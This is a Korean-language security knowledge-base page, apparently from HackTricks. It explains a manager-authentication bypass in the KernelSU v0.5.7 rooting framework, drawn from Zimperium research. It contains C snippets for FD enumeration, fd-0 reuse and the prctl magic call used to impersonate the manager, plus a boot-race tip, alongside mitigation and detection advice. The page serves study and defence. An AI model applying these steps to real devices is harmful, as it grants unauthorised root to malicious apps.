# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU, APatch, SKRoot, Magisk와 같은 Rooting frameworks는 Linux/Android kernel을 자주 patch하고, hooked syscall을 통해 권한이 없는 userspace "manager" app에 privileged functionality를 노출합니다. manager-authentication 단계에 결함이 있으면 모든 local app이 이 channel에 접근하여 이미 rooted된 device에서 privileges를 escalate할 수 있습니다.

이 페이지는 public research에서 밝혀진 techniques와 pitfalls, 특히 Zimperium의 KernelSU v0.5.7 분석을 추상화하여 red team과 blue team 모두가 attack surfaces, exploitation primitives 및 robust mitigations를 이해할 수 있도록 합니다.

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch가 syscall(일반적으로 prctl)을 hook하여 userspace의 "commands"를 수신합니다.
- Protocol은 일반적으로 다음과 같습니다: magic_value, command_id, arg_ptr/len ...
- userspace manager app이 먼저 authenticate합니다(예: CMD_BECOME_MANAGER). Kernel이 caller를 trusted manager로 표시하면 privileged commands가 허용됩니다:
- Caller에게 root 부여(예: CMD_GRANT_ROOT)
- su에 대한 allowlists/deny-lists 관리
- SELinux policy 조정(예: CMD_SET_SEPOLICY)
- Version/configuration 조회
- 모든 app이 syscalls를 invoke할 수 있으므로 manager authentication의 정확성이 critical합니다.

Example (KernelSU design):
- Hooked syscall: prctl
- KernelSU handler로 divert하기 위한 Magic value: 0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspace가 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)를 call하면 KernelSU는 다음을 verify합니다:

1) Path prefix check
- 제공된 path는 caller UID에 대해 예상되는 prefix로 시작해야 합니다. 예: /data/data/<pkg> 또는 /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.

2) Ownership check
- 해당 path는 caller UID가 소유해야 합니다.
- Reference: core_hook.c (v0.5.7) ownership logic.

3) FD table scan을 통한 APK signature check
- Calling process의 open file descriptors(FDs)를 순회합니다.
- path가 /data/app/*/base.apk와 일치하는 첫 번째 file을 선택합니다.
- APK v2 signature를 parse하고 official manager certificate와 대조하여 verify합니다.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).

모든 checks가 통과하면 kernel은 manager의 UID를 일시적으로 cache하고 reset될 때까지 해당 UID의 privileged commands를 accept합니다.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Signature check가 process FD table에서 발견된 "first matching /data/app/*/base.apk"에 bind된다면, 실제로는 caller 자신의 package를 verify하는 것이 아닙니다. Attacker는 legitimately signed APK(실제 manager의 APK)를 미리 배치하여 자신의 base.apk보다 FD list에서 더 앞에 나타나도록 할 수 있습니다.

이러한 trust-by-indirection을 통해 unprivileged app은 manager의 signing key를 소유하지 않고도 manager를 impersonate할 수 있습니다.

Key properties exploited:
- FD scan은 caller의 package identity에 bind되지 않고 path strings만 pattern-match합니다.
- open()은 사용 가능한 가장 낮은 FD를 반환합니다. 먼저 낮은 번호의 FDs를 close하면 attacker가 ordering을 control할 수 있습니다.
- Filter는 path가 /data/app/*/base.apk와 일치하는지만 check하며, 해당 path가 caller의 installed package에 해당하는지는 check하지 않습니다.

---
## Attack preconditions

- Device가 이미 vulnerable rooting framework(예: KernelSU v0.5.7)로 rooted되어 있어야 합니다.
- Attacker가 local에서 임의의 unprivileged code(Android app process)를 실행할 수 있어야 합니다.
- Real manager가 아직 authenticate하지 않은 상태여야 합니다(예: reboot 직후). 일부 frameworks는 success 후 manager UID를 cache하므로 race에서 승리해야 합니다.

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:
1) Prefix 및 ownership checks를 satisfy하기 위해 자신의 app data directory에 대한 valid path를 구성합니다.
2) Genuine KernelSU Manager base.apk가 자신의 base.apk보다 낮은 번호의 FD에 open되도록 합니다.
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)를 invoke하여 checks를 통과합니다.
4) CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY와 같은 privileged commands를 issue하여 elevation을 persist합니다.

Practical notes on step 2 (FD ordering):
- /proc/self/fd symlinks를 순회하여 자신의 /data/app/*/base.apk에 대한 process FD를 identify합니다.
- 낮은 FD(예: stdin, fd 0)를 close한 뒤 legitimate manager APK를 먼저 open하여 fd 0(또는 자신의 base.apk fd보다 낮은 index)을 차지하도록 합니다.
- Legitimate manager APK를 app에 bundle하여 해당 path가 kernel의 naive filter를 satisfy하도록 합니다. 예를 들어 /data/app/*/base.apk와 일치하는 subpath 아래에 배치합니다.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
낮은 번호의 FD가 정식 manager APK를 가리키도록 강제:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
prctl hook을 통한 관리자 인증:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
성공 후, privileged commands (예시):
- CMD_GRANT_ROOT: 현재 process를 root로 승격
- CMD_ALLOW_SU: 지속적인 su를 위해 사용자의 package/UID를 allowlist에 추가
- CMD_SET_SEPOLICY: framework에서 지원하는 방식으로 SELinux policy 조정

Race/persistence 팁:
- AndroidManifest에 BOOT_COMPLETED receiver (RECEIVE_BOOT_COMPLETED)를 등록하여 reboot 후 일찍 시작하고 실제 manager보다 먼저 authentication을 시도

---
## Detection 및 mitigation 가이드

Framework 개발자용:
- authentication을 임의의 FD가 아닌 caller의 package/UID에 bind:
- caller의 package를 UID에서 resolve하고, FD를 scan하는 대신 PackageManager를 통해 설치된 package의 signature와 대조하여 검증
- kernel-only인 경우 안정적인 caller identity (task creds)를 사용하고, process FD가 아닌 init/userspace helper가 관리하는 안정적인 source of truth에서 검증
- path-prefix check를 identity로 사용하지 않기: caller가 이를 trivially satisfy할 수 있음
- channel을 통해 nonce-based challenge–response를 사용하고, boot 또는 주요 event 발생 시 cached manager identity를 clear
- 가능한 경우 generic syscall을 용도 변경하는 대신 binder-based authenticated IPC를 고려

Defender/blue team용:
- rooting framework 및 manager process의 존재를 detect; kernel telemetry가 있다면 의심스러운 magic constant (예: 0xDEADBEEF)를 사용하는 prctl call을 monitor
- managed fleet에서는 boot 직후 untrusted package의 boot receiver가 privileged manager command를 빠르게 시도하는 경우 block하거나 alert
- device가 patched framework version으로 update되었는지 확인; update 시 cached manager ID를 invalidate

Attack의 제한:
- 이미 vulnerable framework로 rooted된 device에만 영향을 줌
- 일반적으로 legitimate manager가 authentication하기 전 reboot/race window가 필요함 (일부 framework는 reset 전까지 manager UID를 cache)

---
## Framework 전반의 관련 참고 사항

- Password-based auth (예: 과거 APatch/SKRoot build)는 password를 추측하거나 bruteforce할 수 있거나 validation에 bug가 있으면 취약할 수 있음
- Package/signature-based auth (예: KernelSU)는 원칙적으로 더 강력하지만, FD scan과 같은 간접 artefact가 아닌 실제 caller에 bind해야 함
- Magisk: CVE-2024-48336 (MagiskEoP)는 mature ecosystem도 identity spoofing에 취약할 수 있으며, 이로 인해 manager context 내부에서 root 권한으로 code execution이 발생할 수 있음을 보여줌

---
## References

- [Zimperium – 모든 악의 근원인 Rooting: Mobile Device를 Compromise할 수 있는 Security Hole](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
